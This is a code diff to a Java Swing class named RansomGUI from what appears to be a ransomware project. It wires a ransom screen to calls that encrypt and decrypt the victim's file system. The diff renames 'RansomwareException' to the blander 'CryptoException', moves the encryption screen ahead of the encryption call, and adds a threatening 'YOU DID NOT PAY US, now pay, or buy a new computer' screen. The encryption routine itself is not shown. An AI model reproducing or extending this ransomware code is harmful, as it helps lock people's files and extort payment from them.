@@ -10,7 +10,7 @@ import javax.swing.JLabel;
 import javax.swing.JPanel;
 
 import Agent.Attack.AttackVector;
-import Agent.exceptions.RansomwareException;
+import Agent.exceptions.CryptoException;
 
 public class RansomGUI extends JFrame implements ActionListener {
 
@@ -20,19 +20,19 @@ public class RansomGUI extends JFrame implements ActionListener {
 	private AttackVector ransomProcess;
 	private static final long serialVersionUID = -486811144121647925L;
 
-	public RansomGUI() throws RansomwareException {
+	public RansomGUI() throws CryptoException {
 		label = new JLabel();
 		panel = new JPanel();
 		panel.setVisible(true);
 		panel.setBackground(Color.BLACK);
 		this.add(panel);
 		this.setVisible(true);
+
+		encryptionScreen();
 		try {
-			
-			encryptionScreen();
 			ransomProcess.encryptFileSystem();
-		} catch (RansomwareException e) {
-			throw new RansomwareException("failed encrypting file system", e.getCause());
+		} catch (CryptoException e) {
+			throw new CryptoException("failed encrypting file system", e.getCause());
 		}
 	}
 
@@ -73,6 +73,7 @@ public class RansomGUI extends JFrame implements ActionListener {
 
 	private void waitScreen() {
 
+		panel.remove(paidButton);
 		label.setText("<html><body bgcolor=\"black\" dir=\"ltr\" >\r\n"
 				+ "<h1 align=\"center\" ><font size=\"12\" color=\"red\" face=\"Showcard Gothic\">Loading... </font></h1>\r\n"
 				+ "<br />\r\n" + "<p align=\"center\">\r\n" +
@@ -92,8 +93,17 @@ public class RansomGUI extends JFrame implements ActionListener {
 		panel.add(label);
 	}
 
+	private void didntPaidScreen() {
+
+		label.setText("<html> <body bgcolor=\"black\" dir=\"ltr\">\r\n" + "\r\n"
+				+ "<h1 align=\"center\" ><font size=\"20\" color=\"red\" face=\"Showcard Gothic\">YOU DID NOT PAY US ,<br />now pay, or buy a new computer :) !</font></h1>\r\n"
+				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n"
+				+ "<br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/>\r\n" + "</body>\r\n </html>");
+		panel.add(label);
+	}
+
 	@Override
-	public void actionPerformed(ActionEvent e) {
+	public void actionPerformed(ActionEvent ex) {
 		panel.remove(paidButton);
 		waitScreen();
 		try {
@@ -101,10 +111,9 @@ public class RansomGUI extends JFrame implements ActionListener {
 			ransomProcess.decryptFileSystem();
 			decryptionScreen();
 
-		} catch (RansomwareException e1) {
-
+		} catch (CryptoException e) {
+			didntPaidScreen();
 		}
 
 	}
-
 }
